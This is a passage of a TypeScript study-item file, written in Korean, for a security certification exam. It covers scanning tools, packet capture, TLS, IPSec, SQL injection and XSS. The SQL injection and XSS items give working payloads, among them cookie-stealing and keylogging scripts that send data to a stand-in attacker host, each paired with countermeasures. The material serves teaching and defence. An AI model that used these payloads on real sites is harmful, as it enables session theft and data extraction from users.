\`\`\`
┌─────────────────────────────────────────────────────┐
│                    Nmap 스캔 단계                    │
├─────────────────────────────────────────────────────┤
│                                                     │
│  1. 호스트 발견        2. 포트 스캔                  │
│  ┌─────────────┐      ┌─────────────┐              │
│  │ -sn (ping)  │ ───▶ │ -sS (SYN)   │              │
│  │ -Pn (skip)  │      │ -sT (TCP)   │              │
│  └─────────────┘      │ -sU (UDP)   │              │
│                       └─────────────┘              │
│                             │                       │
│                             ▼                       │
│  3. 서비스/버전           4. OS 탐지                │
│  ┌─────────────┐      ┌─────────────┐              │
│  │ -sV         │ ◀──▶ │ -O          │              │
│  │ (버전 탐지) │      │ (OS 탐지)   │              │
│  └─────────────┘      └─────────────┘              │
│                             │                       │
│                             ▼                       │
│                    5. 스크립트 엔진                  │
│                    ┌─────────────┐                  │
│                    │ --script    │                  │
│                    │ (NSE 스크립트)│                │
│                    └─────────────┘                  │
└─────────────────────────────────────────────────────┘
\`\`\`

**Nmap 주요 명령어:**

| 옵션 | 설명 | 예시 |
|------|------|------|
| **-sS** | SYN 스캔 (스텔스) | nmap -sS 192.168.1.1 |
| **-sT** | TCP Connect 스캔 | nmap -sT 192.168.1.1 |
| **-sU** | UDP 스캔 | nmap -sU 192.168.1.1 |
| **-sV** | 버전 탐지 | nmap -sV 192.168.1.1 |
| **-O** | OS 탐지 | nmap -O 192.168.1.1 |
| **-A** | 종합 스캔 (-sV -O --script) | nmap -A 192.168.1.1 |
| **-p** | 포트 지정 | nmap -p 1-1000 192.168.1.1 |
| **-Pn** | 핑 스킵 | nmap -Pn 192.168.1.1 |
| **--script** | NSE 스크립트 | nmap --script vuln 192.168.1.1 |

**Nessus vs OpenVAS:**

| 항목 | Nessus | OpenVAS |
|------|--------|---------|
| 라이선스 | 상용 (Home 무료) | 오픈소스 |
| 플러그인 | 매일 업데이트 | 커뮤니티 업데이트 |
| 정확도 | 높음 | 중간 |
| 보고서 | 상세 | 기본 |
| 사용성 | 쉬움 | 중간 |
    `,
    keyPoints: ['Nmap -sS=스텔스 스캔', 'Nmap -A=종합 스캔', 'Nessus=상용 표준', 'OpenVAS=오픈소스'],
    isWeakness: true,
  },

  {
    id: 'security-tools-system',
    category: 'security',
    subcategory: '보안도구',
    title: '시스템 보안 도구',
    content: `
**시스템 보안 도구:**

| 도구 | 용도 | 특징 |
|------|------|------|
| **Tripwire** | 파일 무결성 | 상용/오픈소스, 데이터베이스 기반 |
| **AIDE** | 파일 무결성 | Tripwire 오픈소스 대안 |
| **OSSEC** | HIDS | 로그 분석, 무결성, 루트킷 탐지 |
| **chkrootkit** | 루트킷 탐지 | 빠른 검사, 쉬운 사용 |
| **rkhunter** | 루트킷 탐지 | 종합 검사, 자동 업데이트 |
| **Lynis** | 보안 감사 | 하드닝 가이드 제공 |
| **COPS** | Unix 보안 | 구버전, 기본 검사 |
| **SARA** | 취약점 분석 | SATAN 후속 |

**파일 무결성 검사 흐름 (Tripwire/AIDE):**
\`\`\`
┌─────────────────────────────────────────────────────┐
│               파일 무결성 검사 프로세스              │
├─────────────────────────────────────────────────────┤
│                                                     │
│  1. 초기화 (기준 생성)                               │
│  ┌─────────────────────────────────────────┐       │
│  │  $ tripwire --init                      │       │
│  │  $ aide --init                          │       │
│  │                                         │       │
│  │  파일 스캔 → 해시값 계산 → DB 저장       │       │
│  │  (MD5, SHA-256, 속성 등)                │       │
│  └─────────────────────────────────────────┘       │
│                       │                             │
│                       ▼                             │
│  2. 정기 검사                                       │
│  ┌─────────────────────────────────────────┐       │
│  │  $ tripwire --check                     │       │
│  │  $ aide --check                         │       │
│  │                                         │       │
│  │  현재 상태 스캔 → 저장된 DB와 비교      │       │
│  └─────────────────────────────────────────┘       │
│                       │                             │
│              ┌────────┴────────┐                   │
│              ▼                 ▼                   │
│         [일치]            [불일치]                 │
│         정상               변경 탐지               │
│                           ├── 추가된 파일          │
│                           ├── 삭제된 파일          │
│                           └── 수정된 파일          │
└─────────────────────────────────────────────────────┘
\`\`\`

**루트킷 탐지 도구:**

| 도구 | 검사 항목 |
|------|----------|
| **chkrootkit** | 바이너리 변조, 네트워크 인터페이스, LKM, 로그 |
| **rkhunter** | 바이너리, 부트로더, 네트워크, 숨김 파일/프로세스 |

**사용법:**
\`\`\`bash
# chkrootkit
chkrootkit           # 기본 검사
chkrootkit -q        # 감염된 것만 표시

# rkhunter
rkhunter --update    # DB 업데이트
rkhunter --check     # 검사 실행
rkhunter --sk        # 키 입력 스킵

# AIDE
aide --init          # 초기화
aide --check         # 검사
aide --update        # DB 업데이트

# Lynis
lynis audit system   # 시스템 감사
\`\`\`

**OSSEC 구성:**
\`\`\`
                 ┌─────────────┐
                 │ OSSEC 서버  │
                 │  (Manager)  │
                 └──────┬──────┘
                        │
        ┌───────────────┼───────────────┐
        │               │               │
        ▼               ▼               ▼
   ┌─────────┐    ┌─────────┐    ┌─────────┐
   │ Agent 1 │    │ Agent 2 │    │ Agent 3 │
   │ (Linux) │    │(Windows)│    │ (Linux) │
   └─────────┘    └─────────┘    └─────────┘

기능: 로그 분석, 무결성 검사, 루트킷 탐지, 실시간 경고
\`\`\`
    `,
    keyPoints: ['Tripwire/AIDE=파일 무결성', 'chkrootkit/rkhunter=루트킷', 'OSSEC=HIDS', 'Lynis=보안 감사'],
    isWeakness: true,
  },

  {
    id: 'security-tools-packet',
    category: 'security',
    subcategory: '보안도구',
    title: '패킷 분석 도구',
    content: `
**패킷 분석 도구:**

| 도구 | 인터페이스 | 특징 | 용도 |
|------|-----------|------|------|
| **Wireshark** | GUI | 가장 널리 사용, 필터 강력 | 상세 분석 |
| **tcpdump** | CLI | 경량, 스크립트 연동 | 서버 캡처 |
| **tshark** | CLI | Wireshark CLI 버전 | 자동화 분석 |
| **NetworkMiner** | GUI | 포렌식 특화 | 파일/이미지 추출 |
| **Ettercap** | CLI/GUI | MITM 공격 도구 | ARP 스푸핑 |

**Wireshark 분석 흐름:**
\`\`\`
┌─────────────────────────────────────────────────────┐
│               Wireshark 패킷 분석                    │
├─────────────────────────────────────────────────────┤
│                                                     │
│  1. 캡처                                            │
│  ┌─────────────────────────────────────────┐       │
│  │  네트워크 인터페이스 선택                 │       │
│  │  캡처 필터 설정 (선택)                   │       │
│  │  예: host 192.168.1.1 and port 80       │       │
│  └─────────────────────────────────────────┘       │
│                       │                             │
│                       ▼                             │
│  2. 디스플레이 필터                                 │
│  ┌─────────────────────────────────────────┐       │
│  │  http.request.method == "POST"          │       │
│  │  tcp.port == 443                        │       │
│  │  ip.src == 192.168.1.1                  │       │
│  └─────────────────────────────────────────┘       │
│                       │                             │
│                       ▼                             │
│  3. 분석                                            │
│  ┌─────────────────────────────────────────┐       │
│  │  • Follow TCP Stream (대화 추적)        │       │
│  │  • Statistics → Conversations           │       │
│  │  • Statistics → Protocol Hierarchy      │       │
│  │  • Export Objects (파일 추출)           │       │
│  └─────────────────────────────────────────┘       │
└─────────────────────────────────────────────────────┘
\`\`\`

**주요 Wireshark 필터:**

| 필터 | 설명 |
|------|------|
| **ip.addr == 192.168.1.1** | 특정 IP |
| **tcp.port == 80** | 특정 포트 |
| **http** | HTTP 프로토콜 |
| **http.request.method == "POST"** | POST 요청 |
| **tcp.flags.syn == 1** | SYN 패킷 |
| **dns** | DNS 쿼리 |
| **ftp** | FTP 트래픽 |
| **!arp** | ARP 제외 |
| **frame contains "password"** | 문자열 검색 |

**tcpdump 명령어:**
\`\`\`bash
# 기본 캡처
tcpdump -i eth0                    # 인터페이스 지정
tcpdump -i any                     # 모든 인터페이스

# 필터
tcpdump host 192.168.1.1           # 특정 호스트
tcpdump port 80                    # 특정 포트
tcpdump src 192.168.1.1            # 출발지
tcpdump dst 192.168.1.1            # 목적지
tcpdump tcp                        # TCP만
tcpdump "tcp port 80 and host 192.168.1.1"  # 조합

# 옵션
tcpdump -n                         # 이름 해석 안함
tcpdump -v                         # 상세 출력
tcpdump -w capture.pcap            # 파일 저장
tcpdump -r capture.pcap            # 파일 읽기
tcpdump -c 100                     # 100개만 캡처
tcpdump -A                         # ASCII 출력
tcpdump -X                         # HEX + ASCII

# 예시: HTTP POST 캡처
tcpdump -i eth0 -A 'tcp port 80 and (tcp[32:4] = 0x504f5354)'
\`\`\`

**tshark 예시:**
\`\`\`bash
# HTTP 요청 추출
tshark -i eth0 -Y "http.request" -T fields -e http.host -e http.request.uri

# DNS 쿼리 추출
tshark -i eth0 -Y "dns.qry.name" -T fields -e dns.qry.name

# 파일 저장
tshark -i eth0 -w capture.pcap
\`\`\`
    `,
    keyPoints: ['Wireshark=GUI 분석', 'tcpdump -w=파일 저장', 'tshark=CLI 자동화', '필터=ip.addr/tcp.port'],
    isWeakness: true,
  },

  {
    id: 'attack-flow-sqli',
    category: 'app',
    subcategory: '공격흐름',
    title: 'SQL Injection 공격 흐름',
    content: `
**SQL Injection 공격 단계:**

\`\`\`
┌─────────────────────────────────────────────────────────────────┐
│                   SQL Injection 공격 흐름                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1단계: 취약점 탐지                                              │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  입력값: ' (작은따옴표)                                  │   │
│  │  예상 결과: SQL 에러 메시지 노출                         │   │
│  │                                                         │   │
│  │  "You have an error in your SQL syntax..."              │   │
│  └─────────────────────────────────────────────────────────┘   │
│                              │                                  │
│                              ▼                                  │
│  2단계: 인증 우회                                               │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  입력값: ' OR '1'='1' --                                │   │
│  │                                                         │   │
│  │  원래 쿼리:                                              │   │
│  │  SELECT * FROM users WHERE id='입력' AND pw='입력'      │   │
│  │                                                         │   │
│  │  조작된 쿼리:                                            │   │
│  │  SELECT * FROM users WHERE id='' OR '1'='1' --' AND...  │   │
│  │                            └── 항상 참 ──┘   └주석처리   │   │
│  └─────────────────────────────────────────────────────────┘   │
│                              │                                  │
│                              ▼                                  │
│  3단계: 정보 추출 (UNION)                                       │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  1. 컬럼 수 확인                                        │   │
│  │     ' ORDER BY 1-- (증가시키며 에러 확인)               │   │
│  │                                                         │   │
│  │  2. 출력 위치 확인                                       │   │
│  │     ' UNION SELECT 1,2,3,4--                            │   │
│  │                                                         │   │
│  │  3. DB 정보 추출                                        │   │
│  │     ' UNION SELECT 1,version(),database(),4--           │   │
│  │                                                         │   │
│  │  4. 테이블 목록                                         │   │
│  │     ' UNION SELECT table_name,2,3,4                     │   │
│  │       FROM information_schema.tables--                  │   │
│  │                                                         │   │
│  │  5. 데이터 추출                                         │   │
│  │     ' UNION SELECT username,password,3,4 FROM users--   │   │
│  └─────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────┘
\`\`\`

**SQL Injection 유형:**

| 유형 | 특징 | 기법 |
|------|------|------|
| **Error-based** | 에러 메시지로 정보 추출 | extractvalue(), updatexml() |
| **Union-based** | UNION으로 데이터 결합 | UNION SELECT |
| **Blind Boolean** | 참/거짓 응답 차이 | 1=1, 1=2 비교 |
| **Blind Time** | 응답 시간 차이 | SLEEP(), BENCHMARK() |
| **Out-of-band** | 외부 채널로 데이터 전송 | DNS, HTTP 요청 |

**Blind SQL Injection 흐름:**
\`\`\`
Boolean 기반:
┌──────────────────────────────────────────────────┐
│ ' AND (SELECT SUBSTRING(password,1,1)='a')-- │
│                                                  │
│ 응답: 정상 → 첫 글자가 'a'                       │
│ 응답: 에러 → 첫 글자가 'a' 아님                  │
│                                                  │
│ 한 글자씩 추측하여 전체 값 알아냄                │
└──────────────────────────────────────────────────┘

Time 기반:
┌──────────────────────────────────────────────────┐
│ ' AND IF(SUBSTRING(password,1,1)='a',           │
│          SLEEP(5),0)--                          │
│                                                  │
│ 응답 5초 지연 → 첫 글자가 'a'                   │
│ 응답 즉시    → 첫 글자가 'a' 아님               │
└──────────────────────────────────────────────────┘
\`\`\`

**대응 방안:**

| 대응 | 설명 |
|------|------|
| **PreparedStatement** | 파라미터 바인딩 (가장 효과적) |
| **입력값 검증** | 화이트리스트, 특수문자 필터 |
| **에러 메시지 숨김** | 상세 에러 노출 금지 |
| **최소 권한** | DB 계정 권한 최소화 |
| **WAF** | SQL 패턴 탐지/차단 |
    `,
    keyPoints: ['UNION SELECT=데이터 추출', 'Blind=응답 차이로 추측', 'PreparedStatement=근본 대책', '--=주석처리'],
    isWeakness: true,
  },

  {
    id: 'attack-flow-xss',
    category: 'app',
    subcategory: '공격흐름',
    title: 'XSS 공격 흐름',
    content: `
**XSS 유형별 흐름:**

\`\`\`
┌─────────────────────────────────────────────────────────────────┐
│                    Stored XSS (저장형)                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. 공격자가 악성 스크립트 저장                                  │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  게시판 글쓰기:                                          │   │
│  │  제목: 안녕하세요                                        │   │
│  │  내용: <script>document.location='http://attacker.com/  │   │
│  │        steal?cookie='+document.cookie</script>          │   │
│  └─────────────────────────────────────────────────────────┘   │
│                              │                                  │
│                              ▼                                  │
│  2. DB에 저장                                                   │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  [웹 서버] ──저장──▶ [데이터베이스]                      │   │
│  └─────────────────────────────────────────────────────────┘   │
│                              │                                  │
│                              ▼                                  │
│  3. 피해자가 페이지 열람                                        │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  [피해자] ──요청──▶ [웹 서버] ──조회──▶ [DB]            │   │
│  │           ◀─────────────────────────────                │   │
│  │           악성 스크립트 포함 응답                        │   │
│  └─────────────────────────────────────────────────────────┘   │
│                              │                                  │
│                              ▼                                  │
│  4. 피해자 브라우저에서 스크립트 실행                           │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  쿠키 탈취 → 공격자 서버로 전송                          │   │
│  └─────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│                   Reflected XSS (반사형)                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. 공격자가 악성 링크 전송                                      │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  http://target.com/search?q=<script>alert(1)</script>   │   │
│  └─────────────────────────────────────────────────────────┘   │
│                              │                                  │
│                              ▼                                  │
│  2. 피해자가 링크 클릭                                          │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  [피해자] ──클릭──▶ [웹 서버]                            │   │
│  │           ◀─────────────────                            │   │
│  │           검색결과에 스크립트 포함                       │   │
│  │           "검색어: <script>alert(1)</script>"            │   │
│  └─────────────────────────────────────────────────────────┘   │
│                              │                                  │
│  3. 피해자 브라우저에서 스크립트 실행                           │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│                    DOM-based XSS                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  특징: 서버를 거치지 않고 클라이언트에서만 발생                  │
│                                                                 │
│  취약 코드:                                                     │
│  document.getElementById('output').innerHTML =                  │
│      location.hash.substring(1);                                │
│                                                                 │
│  공격 URL:                                                      │
│  http://target.com/page#<img src=x onerror=alert(1)>           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
\`\`\`

**XSS 공격 페이로드:**

| 용도 | 페이로드 |
|------|----------|
| **기본 테스트** | \`<script>alert(1)</script>\` |
| **이벤트 핸들러** | \`<img src=x onerror=alert(1)>\` |
| **쿠키 탈취** | \`<script>new Image().src="http://attacker/c="+document.cookie</script>\` |
| **키로거** | \`<script>document.onkeypress=function(e){new Image().src="http://attacker/k="+e.key}</script>\` |
| **필터 우회** | \`<svg/onload=alert(1)>\`, \`<body onload=alert(1)>\` |

**대응 방안:**

| 대응 | 설명 |
|------|------|
| **출력 인코딩** | HTML Entity 변환 (&lt; &gt; &amp; &quot;) |
| **입력 검증** | 화이트리스트 방식 |
| **CSP** | Content-Security-Policy 헤더 |
| **HttpOnly** | 쿠키에 HttpOnly 속성 |
| **X-XSS-Protection** | 브라우저 XSS 필터 |
    `,
    keyPoints: ['Stored=DB 저장', 'Reflected=URL 파라미터', 'DOM=클라이언트만', 'HttpOnly=쿠키 보호'],
    isWeakness: true,
  },

  {
    id: 'ssl-tls-handshake',
    category: 'crypto',
    subcategory: 'TLS',
    title: 'SSL/TLS 핸드셰이크',
    content: `
**TLS 1.2 핸드셰이크 과정:**

\`\`\`
┌────────────────────────────────────────────────────────────────┐
│                   TLS 1.2 Handshake                             │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│    [클라이언트]                              [서버]             │
│         │                                      │               │
│         │──────── 1. ClientHello ─────────────▶│               │
│         │         • 지원 TLS 버전              │               │
│         │         • 지원 암호 스위트           │               │
│         │         • Client Random (28바이트)   │               │
│         │         • 세션 ID                   │               │
│         │                                      │               │
│         │◀─────── 2. ServerHello ─────────────│               │
│         │         • 선택된 TLS 버전            │               │
│         │         • 선택된 암호 스위트         │               │
│         │         • Server Random (28바이트)   │               │
│         │         • 세션 ID                   │               │
│         │                                      │               │
│         │◀─────── 3. Certificate ─────────────│               │
│         │         • 서버 인증서 (X.509)        │               │
│         │         • 인증서 체인               │               │
│         │                                      │               │
│         │◀─────── 4. ServerKeyExchange ───────│               │
│         │         • DH 파라미터 (선택적)       │               │
│         │                                      │               │
│         │◀─────── 5. ServerHelloDone ─────────│               │
│         │                                      │               │
│         │──────── 6. ClientKeyExchange ───────▶│               │
│         │         • Pre-Master Secret         │               │
│         │         (서버 공개키로 암호화)       │               │
│         │                                      │               │
│    ┌────┴────┐                           ┌────┴────┐          │
│    │ Master  │ = PRF(Pre-Master +        │ Master  │          │
│    │ Secret  │   Client Random +         │ Secret  │          │
│    │ 생성    │   Server Random)          │ 생성    │          │
│    └────┬────┘                           └────┬────┘          │
│         │                                      │               │
│         │──────── 7. ChangeCipherSpec ────────▶│               │
│         │         (이후 암호화 시작)           │               │
│         │                                      │               │
│         │──────── 8. Finished ────────────────▶│               │
│         │         (암호화된 검증 데이터)       │               │
│         │                                      │               │
│         │◀─────── 9. ChangeCipherSpec ────────│               │
│         │                                      │               │
│         │◀─────── 10. Finished ───────────────│               │
│         │                                      │               │
│         │◀═══════ 암호화된 통신 ══════════════│               │
│         │                                      │               │
└────────────────────────────────────────────────────────────────┘
\`\`\`

**TLS 1.3 개선사항:**

| 항목 | TLS 1.2 | TLS 1.3 |
|------|---------|---------|
| **핸드셰이크** | 2-RTT | 1-RTT (0-RTT 가능) |
| **암호 스위트** | 다양 | AEAD만 (GCM, ChaCha20) |
| **키 교환** | RSA, DH | ECDHE, DHE만 |
| **취약 알고리즘** | RC4, 3DES 포함 | 제거됨 |

**TLS 1.3 핸드셰이크:**
\`\`\`
[클라이언트]                              [서버]
     │                                      │
     │── ClientHello + KeyShare ───────────▶│
     │                                      │
     │◀── ServerHello + KeyShare ──────────│
     │◀── EncryptedExtensions ─────────────│
     │◀── Certificate ─────────────────────│
     │◀── CertificateVerify ───────────────│
     │◀── Finished ────────────────────────│
     │                                      │
     │── Finished ─────────────────────────▶│
     │                                      │
     │◀═══════ 암호화된 통신 ══════════════│

* 1-RTT로 단축 (2번의 메시지 교환)
* 0-RTT: 재연결 시 첫 요청부터 데이터 전송 가능
\`\`\`

**암호 스위트 예시:**
\`\`\`
TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256

├─ ECDHE     : 키 교환 (타원곡선 DH)
├─ RSA       : 인증 (서버 인증서)
├─ AES_128   : 대칭키 암호화 (128비트)
├─ GCM       : 블록 암호 모드
└─ SHA256    : 해시 (MAC)
\`\`\`
    `,
    keyPoints: ['TLS 1.2=2-RTT', 'TLS 1.3=1-RTT', 'Master Secret=세션키 생성', 'ChangeCipherSpec=암호화 시작'],
    isWeakness: true,
  },

  {
    id: 'ipsec-flow',
    category: 'network',
    subcategory: 'VPN',
    title: 'IPSec 동작 흐름',
    content: `
**IPSec 구성요소:**

| 구성 | 역할 |
|------|------|
| **AH** | 인증 헤더, 무결성+인증 (기밀성 X) |
| **ESP** | 암호화 페이로드, 기밀성+무결성+인증 |
| **IKE** | 키 교환 프로토콜 |
| **SA** | 보안 연관, 협상된 보안 파라미터 |

**IPSec 모드:**

\`\`\`
┌─────────────────────────────────────────────────────────────────┐
│                      Transport Mode                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  원본: [IP 헤더][TCP/UDP][데이터]                                │
│                                                                 │
│  ESP:  [IP 헤더][ESP 헤더][TCP/UDP][데이터][ESP 트레일러][ESP 인증]│
│                  └────────── 암호화 ──────────┘                 │
│                                                                 │
│  특징: IP 헤더 보존, 종단간 통신, 호스트-호스트                   │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│                       Tunnel Mode                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  원본: [IP 헤더][TCP/UDP][데이터]                                │
│                                                                 │
│  ESP:  [새 IP][ESP 헤더][원본 IP][TCP/UDP][데이터][ESP 트레일러][인증]│
│                        └────────── 암호화 ──────────────┘       │
│                                                                 │
│  특징: 전체 패킷 암호화, VPN 게이트웨이간 통신                    │
└─────────────────────────────────────────────────────────────────┘
\`\`\`

**IKE Phase 1 & 2:**

\`\`\`
┌─────────────────────────────────────────────────────────────────┐
│                      IKE 협상 과정                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Phase 1: IKE SA 수립 (관리용 보안 채널)                         │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  [Initiator]                         [Responder]        │   │
│  │       │                                   │             │   │
│  │       │─── SA 제안 (암호/해시/DH) ────────▶│             │   │
│  │       │◀── SA 수락 ───────────────────────│             │   │
│  │       │                                   │             │   │
│  │       │─── DH 공개값 + Nonce ─────────────▶│             │   │
│  │       │◀── DH 공개값 + Nonce ─────────────│             │   │
│  │       │                                   │             │   │
│  │       │─── 인증 (암호화됨) ───────────────▶│             │   │
│  │       │◀── 인증 (암호화됨) ───────────────│             │   │
│  │       │                                   │             │   │
│  │       │     [IKE SA 수립 완료]             │             │   │
│  └─────────────────────────────────────────────────────────┘   │
│                              │                                  │
│                              ▼                                  │
│  Phase 2: IPSec SA 수립 (실제 데이터용)                          │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │       │                                   │             │   │
│  │       │─── IPSec SA 제안 ─────────────────▶│             │   │
│  │       │    (ESP/AH, 암호, 해시, 모드)      │             │   │
│  │       │                                   │             │   │
│  │       │◀── IPSec SA 수락 ─────────────────│             │   │
│  │       │                                   │             │   │
│  │       │─── 확인 ─────────────────────────▶│             │   │
│  │       │                                   │             │   │
│  │       │     [IPSec SA 수립 완료]           │             │   │
│  │       │                                   │             │   │
│  │       │◀═════ 암호화된 데이터 통신 ═══════│             │   │
│  └─────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────┘
\`\`\`

**AH vs ESP:**

| 항목 | AH | ESP |
|------|-----|-----|
| **기밀성** | X | O |
| **무결성** | O (IP 헤더 포함) | O |
| **인증** | O | O |
| **재전송 방지** | O | O |
| **프로토콜 번호** | 51 | 50 |
| **NAT 호환** | X | O (NAT-T) |
    `,
    keyPoints: ['Transport=종단간', 'Tunnel=게이트웨이간', 'Phase1=IKE SA', 'Phase2=IPSec SA'],
    isWeakness: true,
  },

  // ==================== 포트 스캐닝 ====================
  {
    id: 'port-scanning-complete',
    category: 'network',
    subcategory: '포트 스캐닝',
    title: 'NMAP 포트 스캐닝 완벽 정리',
    content: `
**NMAP 스캔 유형 총정리:**

| 옵션 | 스캔 이름 | 설명 | 로그 | 포트 닫힘 응답 |
|------|----------|------|------|---------------|
| \`-sT\` | TCP Connect | 전체 3-way handshake | **남음** | RST |
| \`-sS\` | SYN Scan (Half-open) | SYN만 보냄, 스텔스 | 안 남음 | RST |
| \`-sF\` | FIN Scan | FIN 플래그만 | 안 남음 | RST |
| \`-sN\` | NULL Scan | 플래그 없음 | 안 남음 | RST |
| \`-sX\` | Xmas Scan | FIN+PSH+URG | 안 남음 | RST |
| \`-sU\` | UDP Scan | UDP 포트 스캔 | - | **ICMP Port Unreachable** |
| \`-sP\` | Ping Scan | 호스트 생존 확인 | 남음 | - |
| \`-sA\` | ACK Scan | 방화벽 규칙 확인용 | - | RST |

**TCP 스텔스 스캔 동작 원리:**
\`\`\`
┌─────────────────────────────────────────────────────────────┐
│                    TCP Stealth Scan                          │
├─────────────────────────────────────────────────────────────┤
│  [SYN Scan -sS]                                              │
│                                                              │
│    공격자              대상 (열림)         대상 (닫힘)        │
│       │                   │                   │              │
│       │──── SYN ─────────▶│                   │              │
│       │◀─── SYN/ACK ──────│                   │              │
│       │──── RST ─────────▶│  (연결 안 함)     │              │
│       │                   │                   │              │
│       │──── SYN ─────────────────────────────▶│              │
│       │◀─── RST ─────────────────────────────│              │
│                                                              │
├─────────────────────────────────────────────────────────────┤
│  [FIN/NULL/Xmas Scan]                                        │
│                                                              │
│    공격자              대상 (열림)         대상 (닫힘)        │
│       │                   │                   │              │
│       │── FIN/NULL/Xmas ─▶│                   │              │
│       │      (무응답)     │                   │              │
│       │                   │                   │              │
│       │── FIN/NULL/Xmas ─────────────────────▶│              │
│       │◀──── RST ────────────────────────────│              │
│                                                              │
│  ※ Windows는 열린 포트도 RST 응답 → 스캔 불가               │
└─────────────────────────────────────────────────────────────┘
\`\`\`

**UDP Scan 동작:**
\`\`\`
┌─────────────────────────────────────────────────────────────┐
│                      UDP Scan -sU                            │
├─────────────────────────────────────────────────────────────┤
│    공격자              대상 (열림)         대상 (닫힘)        │
│       │                   │                   │              │
│       │── UDP 패킷 ──────▶│                   │              │
│       │   (무응답/응답)   │                   │              │
│       │                   │                   │              │
│       │── UDP 패킷 ──────────────────────────▶│              │
│       │◀─ ICMP Port Unreachable ─────────────│              │
│                                                              │
│  ※ UDP는 연결 개념 없어서 느림                              │
└─────────────────────────────────────────────────────────────┘
\`\`\`

**포트 상태별 응답 정리:**

| 스캔 | 열린 포트 | 닫힌 포트 | 필터링됨 |
|------|----------|----------|----------|
| **SYN** | SYN/ACK | RST | 무응답/ICMP |
| **Connect** | 연결 성공 | RST | 무응답/ICMP |
| **FIN/NULL/Xmas** | 무응답 | RST | 무응답/ICMP |
| **UDP** | UDP 응답/무응답 | ICMP Unreachable | 무응답/ICMP |
| **ACK** | RST | RST | 무응답/ICMP |

**기타 NMAP 옵션:**

| 옵션 | 설명 |
|------|------|
| \`-O\` | OS 탐지 |
| \`-sV\` | 서비스 버전 탐지 |
| \`-A\` | 전체 탐지 (OS + 버전 + 스크립트) |
| \`-p\` | 포트 지정 (-p 80,443 / -p 1-1000) |
| \`-f\` | 패킷 단편화 (IDS 우회) |
| \`--mtu\` | MTU 크기 지정 |
| \`-D\` | Decoy (가짜 IP로 위장) |
| \`-T\` | 타이밍 (0=느림 ~ 5=빠름) |
| \`--script\` | NSE 스크립트 실행 |

**FTP Bounce Attack:**
\`\`\`
┌──────────┐   1. PORT 명령    ┌───────────┐   2. 연결 시도   ┌──────────┐
│  공격자   │─────────────────▶│ FTP 서버   │────────────────▶│  피해자   │
│          │                   │  (익명)    │                  │          │
└──────────┘                   └───────────┘                  └──────────┘
     │                                │                              │
     │ 3. 응답으로 포트 상태 확인     │                              │
     │◀───────────────────────────────┘                              │

※ 자기 자신 스캔 ❌  →  제3의 시스템 스캔 ⭕
※ 공격자 IP 숨기기 가능
\`\`\`
    `,
    keyPoints: [
      '-sT=Connect(로그O)',
      '-sS=SYN(Half-open)',
      '-sX=Xmas(FIN+PSH+URG)',
      'TCP스텔스: 닫힘→RST',
      'UDP: 닫힘→ICMP Unreachable',
      'FTP Bounce=제3자 스캔'
    ],
    isWeakness: true,
  },
];

// 총 추가 학습 항목 수
export const additionalStudyItemsCount = additionalStudyItems.length;
